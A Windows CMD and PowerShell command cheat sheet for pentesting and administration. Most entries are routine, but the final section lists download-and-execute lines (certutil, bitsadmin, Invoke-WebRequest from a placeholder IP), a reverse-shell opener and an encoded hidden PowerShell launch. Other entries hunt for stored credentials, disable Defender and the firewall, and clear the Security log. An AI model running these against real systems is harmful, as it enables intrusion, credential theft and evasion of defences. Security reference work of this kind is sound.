# WINDOWS COMMAND REFERENCE GUIDE
### Pentesting & Security Engineering Edition
### CMD + PowerShell · 18 Sections · 200+ Commands

> Commands marked with [PS] are PowerShell. Commands marked with [CMD] are Command Prompt.
> Commands with no tag work in both or are context-obvious.

---

## 01  ACCESS & HELP

| Command | Description |
|---------|-------------|
| `help <cmd>` [CMD] | Show help for a command |
| `<cmd> /?` [CMD] | Alternative help flag for most CMD commands |
| `Get-Help <cmdlet>` [PS] | Full help for a PowerShell cmdlet |
| `Get-Help <cmdlet> -Examples` [PS] | Show usage examples for a cmdlet |
| `Get-Command *keyword*` [PS] | Search for cmdlets by keyword |
| `runas /user:Administrator <cmd>` | Run a command as another user |
| `Start-Process <cmd> -Verb RunAs` [PS] | Launch a process with UAC elevation |

---

## 02  IDENTITY & SYSTEM INFO

| Command | Description |
|---------|-------------|
| `whoami` | Print current logged-in username |
| `whoami /all` | Show username, SID, groups, and privileges |
| `whoami /priv` | List current user's privileges (look for SeImpersonatePrivilege etc.) |
| `net user` | List all local user accounts |
| `net user <username>` | Show details for a specific user |
| `net localgroup` | List all local groups |
| `net localgroup administrators` | List members of the local Administrators group |
| `hostname` | Print the computer name |
| `systeminfo` | Detailed OS, hardware, and patch info |
| `systeminfo \| findstr /B /C:"OS"` | Filter systeminfo to OS details only |
| `ver` [CMD] | Print Windows version |
| `$PSVersionTable` [PS] | Show PowerShell version and runtime info |
| `Get-ComputerInfo` [PS] | Comprehensive system information |
| `wmic os get Caption,Version,BuildNumber` | OS name, version, and build via WMI |
| `wmic cpu get Name,NumberOfCores` | CPU name and core count |
| `wmic memorychip get Capacity` | Installed RAM per stick |
| `echo %USERNAME%` [CMD] | Print current username from environment |
| `echo %COMPUTERNAME%` [CMD] | Print computer name from environment |
| `echo %OS%` [CMD] | Print OS name from environment |
| `date /t && time /t` [CMD] | Print current date and time |
| `Get-Date` [PS] | Print current date and time (PowerShell) |

---

## 03  NAVIGATION & FILE BASICS

| Command | Description |
|---------|-------------|
| `cd` or `pwd` | Print current directory |
| `cd <path>` | Change directory |
| `cd ..` | Go up one directory level |
| `cd /d D:\path` [CMD] | Change drive and directory at the same time |
| `dir` [CMD] | List files and folders in current directory |
| `dir /a` [CMD] | List including hidden and system files |
| `dir /s /b *.txt` [CMD] | Recursive search for .txt files, bare output |
| `Get-ChildItem` or `ls` or `gci` [PS] | List files and folders (PowerShell) |
| `Get-ChildItem -Force` [PS] | Include hidden files |
| `Get-ChildItem -Recurse -Filter *.txt` [PS] | Recursive search for .txt files |
| `cls` [CMD] | Clear the terminal screen |
| `Clear-Host` or `clear` [PS] | Clear the PowerShell screen |

---

## 04  FILE & DIRECTORY OPERATIONS

| Command | Description |
|---------|-------------|
| `type <file>` [CMD] | Print file content to stdout |
| `Get-Content <file>` or `cat` [PS] | Print file content (PowerShell) |
| `Get-Content <file> -Tail 20` [PS] | Print last 20 lines of a file |
| `Get-Content <file> -Wait` [PS] | Follow a file in real time (like tail -f) |
| `more <file>` | View file page by page |
| `copy src dst` [CMD] | Copy a file |
| `xcopy src dst /E /I` [CMD] | Copy directory recursively |
| `robocopy src dst /E` | Robust copy with full directory tree (preferred over xcopy) |
| `Copy-Item src dst -Recurse` [PS] | Copy file or directory (PowerShell) |
| `move src dst` [CMD] | Move or rename a file |
| `Move-Item src dst` [PS] | Move or rename (PowerShell) |
| `del <file>` [CMD] | Delete a file |
| `del /f /q <file>` [CMD] | Force-delete without prompt |
| `Remove-Item <file>` [PS] | Delete a file (PowerShell) |
| `Remove-Item <dir> -Recurse -Force` [PS] | Delete a directory and all contents |
| `mkdir <dir>` | Create a new directory |
| `New-Item <file> -ItemType File` [PS] | Create an empty file |
| `New-Item <dir> -ItemType Directory` [PS] | Create a directory (PowerShell) |
| `ren old new` [CMD] | Rename a file or folder |
| `Rename-Item old new` [PS] | Rename (PowerShell) |
| `mklink link target` [CMD] | Create a symbolic link (requires admin) |
| `attrib <file>` | Show file attributes (hidden, system, read-only) |
| `attrib +h <file>` | Set hidden attribute on a file |
| `attrib -h <file>` | Remove hidden attribute from a file |

---

## 05  SEARCH & DISCOVERY

| Command | Description |
|---------|-------------|
| `where <cmd>` [CMD] | Find the full path of an executable |
| `Get-Command <cmd>` [PS] | Find executable or cmdlet path |
| `findstr "pattern" <file>` [CMD] | Search for a string in a file (like grep) |
| `findstr /S /I "pattern" *.txt` [CMD] | Recursive, case-insensitive search in .txt files |
| `findstr /R "regex" <file>` [CMD] | Regex search in a file |
| `Select-String "pattern" <file>` [PS] | Search for pattern in file (PowerShell grep) |
| `Select-String -Path *.log -Pattern "error" -Recurse` [PS] | Recursive pattern search |
| `dir /s /b *password*` [CMD] | Recursively find files with "password" in name |
| `Get-ChildItem -Recurse -Include *.config` [PS] | Find all .config files recursively |
| `where /r C:\ *.xml` [CMD] | Recursive search for .xml files from C:\ |

---

## 06  TEXT PROCESSING

| Command | Description |
|---------|-------------|
| `findstr "pattern" <file>` [CMD] | Basic string search in file |
| `find "string" <file>` [CMD] | Find exact string in a file |
| `find /C "string" <file>` [CMD] | Count lines containing the string |
| `find /V "string" <file>` [CMD] | Print lines NOT containing the string |
| `sort <file>` [CMD] | Sort lines alphabetically |
| `more <file>` [CMD] | Paginate file output |
| `<cmd> \| clip` | Pipe output to clipboard |
| `<cmd> \| findstr "pattern"` | Filter command output by pattern |
| `<cmd> \| findstr /V "pattern"` | Filter OUT lines matching pattern |
| `(Get-Content <file>) -replace 'old','new'` [PS] | Replace text in file content |
| `Get-Content <file> \| Select-String "pattern"` [PS] | Grep file content |
| `Get-Content <file> \| Select-Object -First 20` [PS] | First 20 lines |
| `Get-Content <file> \| Measure-Object -Line` [PS] | Count lines in file |
| `"text" \| Out-File <file>` [PS] | Write text to a file |
| `<cmd> \| Out-File <file> -Append` [PS] | Append command output to a file |
| `<cmd> \| Tee-Object <file>` [PS] | Write to file and stdout simultaneously |

---

## 07  PACKAGE & SOFTWARE MANAGEMENT

| Command | Description |
|---------|-------------|
| `winget install <pkg>` | Install a package (Windows Package Manager) |
| `winget upgrade` | List all available upgrades |
| `winget upgrade --all` | Upgrade all installed packages |
| `winget uninstall <pkg>` | Uninstall a package |
| `winget search <term>` | Search for available packages |
| `winget list` | List all installed packages |
| `choco install <pkg>` | Install via Chocolatey (if installed) |
| `choco upgrade all` | Upgrade all Chocolatey packages |
| `Get-Package` [PS] | List installed packages (PowerShell PackageManagement) |
| `wmic product get Name,Version` | List installed programs via WMI |
| `Get-WmiObject -Class Win32_Product` [PS] | List installed programs (PowerShell WMI) |

---

## 08  DISK & FILESYSTEM

| Command | Description |
|---------|-------------|
| `wmic logicaldisk get Caption,FreeSpace,Size` | Disk space per drive |
| `Get-PSDrive` [PS] | List drives and free space |
| `Get-Volume` [PS] | Detailed volume info including filesystem type |
| `diskpart` | Interactive disk partitioning tool (launch, then type help) |
| `fsutil volume diskfree C:` | Free space on a volume |
| `chkdsk C:` | Check disk for errors (read-only) |
| `chkdsk C: /f` | Fix filesystem errors (requires reboot for system drive) |
| `format D: /FS:NTFS /Q` | Quick format a volume as NTFS |
| `subst X: C:\path` | Map a path to a virtual drive letter |
| `net use Z: \\server\share` | Map a network share to a drive letter |
| `net use Z: /delete` | Disconnect a mapped network drive |

---

## 09  PROCESSES & PERFORMANCE

| Command | Description |
|---------|-------------|
| `tasklist` [CMD] | List all running processes |
| `tasklist /fi "imagename eq notepad.exe"` [CMD] | Filter processes by name |
| `taskkill /PID <pid>` [CMD] | Terminate a process by PID |
| `taskkill /IM notepad.exe /F` [CMD] | Force-kill a process by name |
| `Get-Process` [PS] | List all running processes (PowerShell) |
| `Get-Process -Name chrome` [PS] | Find a specific process by name |
| `Stop-Process -Name notepad` [PS] | Kill a process by name |
| `Stop-Process -Id <pid> -Force` [PS] | Force-kill a process by PID |
| `Start-Process <exe>` [PS] | Start a new process |
| `wmic process get Name,ProcessId,CommandLine` | List processes with full command line |
| `wmic process where name="malware.exe" delete` | Kill a process via WMI |
| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 10` [PS] | Top 10 CPU-hungry processes |
| `perfmon` | Open Performance Monitor GUI |
| `resmon` | Open Resource Monitor GUI |
| `Get-ScheduledTask` [PS] | List all scheduled tasks |
| `schtasks /query /fo LIST /v` [CMD] | List scheduled tasks verbosely |
| `schtasks /create /tn "Task" /tr "cmd.exe" /sc onlogon` [CMD] | Create a scheduled task on logon |
| `schtasks /delete /tn "Task" /f` [CMD] | Delete a scheduled task |

---

## 10  USERS, GROUPS & PERMISSIONS

| Command | Description |
|---------|-------------|
| `net user <user> <pass> /add` | Create a local user account |
| `net user <user> /delete` | Delete a local user account |
| `net user <user> *` | Change a user's password interactively |
| `net localgroup administrators <user> /add` | Add user to local Administrators group |
| `net localgroup administrators <user> /delete` | Remove user from Administrators group |
| `net accounts` | Show password and lockout policy |
| `New-LocalUser` [PS] | Create a local user (PowerShell) |
| `Add-LocalGroupMember -Group "Administrators" -Member <user>` [PS] | Add user to Administrators |
| `Get-LocalUser` [PS] | List all local users |
| `Get-LocalGroup` [PS] | List all local groups |
| `Get-LocalGroupMember Administrators` [PS] | List Administrators group members |
| `icacls <file>` | Show file permissions (ACLs) |
| `icacls <file> /grant user:F` | Grant full control to a user |
| `icacls <file> /deny user:W` | Deny write access to a user |
| `icacls <file> /reset` | Reset permissions to inherited defaults |
| `takeown /f <file>` | Take ownership of a file |
| `cacls <file>` | Legacy alternative to icacls |
| `Get-Acl <file>` [PS] | Show file ACL (PowerShell) |
| `Set-Acl <file> $acl` [PS] | Apply an ACL to a file |

---

## 11  NETWORKING

| Command | Description |
|---------|-------------|
| `ipconfig` | Show IP addresses for all network interfaces |
| `ipconfig /all` | Full details including MAC, DNS, DHCP info |
| `ipconfig /flushdns` | Flush the local DNS resolver cache |
| `ipconfig /release` | Release DHCP lease |
| `ipconfig /renew` | Renew DHCP lease |
| `ping <host>` | Send ICMP echo requests to test connectivity |
| `ping -t <host>` | Continuous ping until stopped (Ctrl+C) |
| `tracert <host>` | Trace route to a host (Windows traceroute) |
| `pathping <host>` | Combined traceroute and ping statistics |
| `nslookup <domain>` | DNS query for a domain |
| `nslookup -type=MX <domain>` | Look up MX records for a domain |
| `Resolve-DnsName <domain>` [PS] | DNS lookup (PowerShell) |
| `netstat -ano` | All connections with PID, no name resolution |
| `netstat -ano \| findstr :<port>` | Filter connections on a specific port |
| `Get-NetTCPConnection` [PS] | List TCP connections (PowerShell) |
| `Get-NetTCPConnection -State Listen` [PS] | Show only listening ports |
| `Get-NetAdapter` [PS] | List network adapters and their status |
| `Get-NetIPAddress` [PS] | Show all IP addresses |
| `Get-NetRoute` [PS] | Display the routing table |
| `route print` [CMD] | Print the routing table |
| `route add 10.0.0.0 mask 255.0.0.0 192.168.1.1` [CMD] | Add a static route |
| `arp -a` | Show ARP cache (IP to MAC mappings) |
| `netsh wlan show profiles` | List saved Wi-Fi profiles |
| `netsh wlan show profile name="SSID" key=clear` | Show Wi-Fi password in plaintext |
| `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=<ip> connectport=80` | Port forwarding via netsh |
| `curl <URL>` | HTTP request (available in modern Windows) |
| `Invoke-WebRequest <URL>` or `wget` [PS] | Download a URL or make HTTP requests |
| `Invoke-WebRequest <URL> -OutFile <file>` [PS] | Download file from URL |

---

## 12  REMOTE ACCESS & TRANSFER

| Command | Description |
|---------|-------------|
| `ssh user@host` | Connect to a remote host via SSH |
| `ssh -i key.pem user@host` | SSH with a private key file |
| `ssh -L 8080:localhost:80 user@host` | Local port forwarding via SSH |
| `scp <file> user@host:/path` | Copy file to remote over SSH |
| `mstsc` | Launch Remote Desktop Connection GUI |
| `mstsc /v:<host>` | Connect to a remote host via RDP directly |
| `Enter-PSSession -ComputerName <host>` [PS] | Interactive PowerShell remoting (WinRM) |
| `Invoke-Command -ComputerName <host> -ScriptBlock { <cmd> }` [PS] | Run a command on a remote machine |
| `net use \\host\share /user:<user> <pass>` | Connect to a remote SMB share |
| `net view \\<host>` | List shares on a remote host |
| `robocopy src \\host\share /E` | Copy directory tree to a network share |

---

## 13  SERVICES & REGISTRY

| Command | Description |
|---------|-------------|
| `sc query` | List all services and their state |
| `sc query <service>` | Check status of a specific service |
| `sc start <service>` | Start a service |
| `sc stop <service>` | Stop a service |
| `sc config <service> start= auto` | Set service to start automatically |
| `sc create <name> binPath= "C:\path\svc.exe"` | Create a new service |
| `sc delete <service>` | Delete a service |
| `Get-Service` [PS] | List all services |
| `Get-Service <name>` [PS] | Get status of a specific service |
| `Start-Service <name>` [PS] | Start a service |
| `Stop-Service <name>` [PS] | Stop a service |
| `Restart-Service <name>` [PS] | Restart a service |
| `Set-Service <name> -StartupType Automatic` [PS] | Change service startup type |
| `reg query HKLM\Software` [CMD] | List registry keys under a path |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Check auto-run entries |
| `reg add HKCU\...\Run /v MyApp /t REG_SZ /d "C:\app.exe"` | Add a registry run key |
| `reg delete HKCU\...\Run /v MyApp /f` | Delete a registry value |
| `reg export HKLM\Software output.reg` | Export a registry key to file |
| `Get-ItemProperty HKLM:\Software\...` [PS] | Read registry values (PowerShell) |
| `Set-ItemProperty HKLM:\...\Run -Name "App" -Value "C:\app.exe"` [PS] | Set a registry value |

---

## 14  EVENT LOGS & AUDITING

| Command | Description |
|---------|-------------|
| `eventvwr` | Open Event Viewer GUI |
| `wevtutil qe System /c:10 /f:text` | Query last 10 System log events as text |
| `wevtutil qe Security /q:"*[EventData[Data='Administrator']]"` | Query Security log for a specific user |
| `wevtutil cl Security` | Clear the Security event log (requires admin) |
| `Get-EventLog -LogName System -Newest 20` [PS] | Last 20 System log events |
| `Get-EventLog -LogName Security -InstanceId 4624` [PS] | Successful logon events (Event ID 4624) |
| `Get-WinEvent -LogName Security -MaxEvents 50` [PS] | Modern event query (preferred over Get-EventLog) |
| `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}` [PS] | Failed logon events (Event ID 4625) |
| `Get-WinEvent -FilterHashtable @{LogName='System'; Level=2}` [PS] | Error-level System events |

---

## 15  ENVIRONMENT & SHELL

| Command | Description |
|---------|-------------|
| `set` [CMD] | Print all environment variables |
| `set VAR=value` [CMD] | Set an environment variable for current session |
| `echo %VAR%` [CMD] | Print value of an environment variable |
| `setx VAR value` [CMD] | Set environment variable permanently (user scope) |
| `setx VAR value /M` [CMD] | Set environment variable permanently (system scope, admin) |
| `$env:VAR` [PS] | Read an environment variable in PowerShell |
| `$env:VAR = "value"` [PS] | Set environment variable in current PS session |
| `[System.Environment]::SetEnvironmentVariable("VAR","val","User")` [PS] | Set env var permanently |
| `Get-ChildItem Env:` [PS] | List all environment variables |
| `$PROFILE` [PS] | Print path to current PowerShell profile |
| `notepad $PROFILE` [PS] | Edit your PowerShell profile |
| `Set-ExecutionPolicy RemoteSigned` [PS] | Allow local scripts to run (requires admin) |
| `Set-ExecutionPolicy Bypass -Scope Process` [PS] | Bypass policy for current session only |
| `Get-ExecutionPolicy` [PS] | Check current execution policy |
| `powershell -ExecutionPolicy Bypass -File script.ps1` | Run a script bypassing policy |
| `cmd /c "<cmd>"` | Run a CMD command from PowerShell |
| `Start-Transcript -Path log.txt` [PS] | Log all PowerShell session output to file |
| `Stop-Transcript` [PS] | Stop session logging |

---

## 16  FIREWALL & DEFENDER

| Command | Description |
|---------|-------------|
| `netsh advfirewall show allprofiles` | Show firewall state for all profiles |
| `netsh advfirewall set allprofiles state off` | Disable Windows Firewall (all profiles, needs admin) |
| `netsh advfirewall set allprofiles state on` | Enable Windows Firewall |
| `netsh advfirewall firewall add rule name="Allow80" dir=in action=allow protocol=TCP localport=80` | Add inbound firewall rule |
| `netsh advfirewall firewall delete rule name="Allow80"` | Delete a firewall rule |
| `Get-NetFirewallRule` [PS] | List all firewall rules |
| `Get-NetFirewallRule -Enabled True -Direction Inbound` [PS] | List active inbound rules |
| `New-NetFirewallRule -DisplayName "Allow80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow` [PS] | Add rule (PowerShell) |
| `Set-MpPreference -DisableRealtimeMonitoring $true` [PS] | Disable Windows Defender real-time monitoring (admin) |
| `Get-MpThreatDetection` [PS] | List threats detected by Defender |
| `Add-MpPreference -ExclusionPath "C:\tools"` [PS] | Add Defender exclusion for a path |

---

## 17  ACTIVE DIRECTORY (LOCAL RECON)

| Command | Description |
|---------|-------------|
| `net user /domain` | List all domain users |
| `net user <user> /domain` | Get info on a specific domain user |
| `net group /domain` | List all domain groups |
| `net group "Domain Admins" /domain` | List members of Domain Admins |
| `net accounts /domain` | Domain password and lockout policy |
| `nltest /dclist:<domain>` | List domain controllers |
| `nltest /domain_trusts` | List domain trusts |
| `gpresult /r` | Show applied Group Policy for current user |
| `gpresult /h report.html` | Export GPO report to HTML |
| `Get-ADUser -Filter * -Properties *` [PS] | List all AD users with all properties (requires RSAT) |
| `Get-ADGroupMember "Domain Admins"` [PS] | List Domain Admins members (RSAT) |
| `Get-ADComputer -Filter *` [PS] | List all computers in domain (RSAT) |
| `Get-ADDomain` [PS] | Show domain info (RSAT) |
| `dsquery user -limit 0` | Query all domain users via dsquery |
| `dsquery group -name "Domain Admins"` | Query a specific domain group |

---

## 18  SECURITY & PENTESTING

| Command | Description |
|---------|-------------|
| `whoami /priv` | Check current privileges — look for SeImpersonatePrivilege, SeDebugPrivilege |
| `whoami /all` | Full token info: username, SID, groups, privileges |
| `net localgroup administrators` | Who has local admin access |
| `net user /domain` | Enumerate domain users |
| `net group "Domain Admins" /domain` | Check Domain Admin members |
| `systeminfo \| findstr /B /C:"OS" /C:"Hotfix"` | OS version and installed patches |
| `wmic qfe list brief` | List installed hotfixes and patches |
| `wmic product get Name,Version` | List installed software |
| `tasklist /svc` | List processes with associated services |
| `wmic process get Name,ProcessId,CommandLine` | Full process list with command lines |
| `netstat -ano` | All network connections with PID |
| `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | Check for autologon credentials |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services` | Enumerate services in registry |
| `reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s` | Saved PuTTY sessions (may have creds) |
| `dir /s *pass* == *cred* == *vnc* == *.config*` [CMD] | Search for credential-containing files |
| `Get-ChildItem -Recurse -Include *.xml,*.ini,*.txt \| Select-String -Pattern "password"` [PS] | Search files for "password" string |
| `icacls "C:\Program Files" /findsid *S-1-1-0*` | Find world-writable program directories |
| `accesschk.exe -uwdqs Users C:\` | Check folder write perms for Users group (Sysinternals) |
| `schtasks /query /fo LIST /v \| findstr /B /C:"Task To Run" /C:"Run As User"` | List scheduled tasks with run-as context |
| `sc qc <service>` | Check service binary path and start type |
| `Get-WmiObject Win32_Service \| Where-Object {$_.PathName -notlike "C:\Windows*"}` [PS] | Find non-standard service binaries |
| `powershell -ExecutionPolicy Bypass -NoP -NonI -W Hidden -Enc <base64>` | Common obfuscated PS execution pattern |
| `certutil -urlcache -split -f http://<ip>/file.exe file.exe` | Download file via certutil (LOLBin) |
| `bitsadmin /transfer job /download /priority normal http://<ip>/file.exe C:\file.exe` | Download via BITS (LOLBin) |
| `Invoke-WebRequest http://<ip>/shell.ps1 -OutFile shell.ps1; .\shell.ps1` [PS] | Download and execute a PS script |
| `$client = New-Object System.Net.Sockets.TCPClient('<ip>',4444)` [PS] | PowerShell reverse shell start |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell if you land on WSL |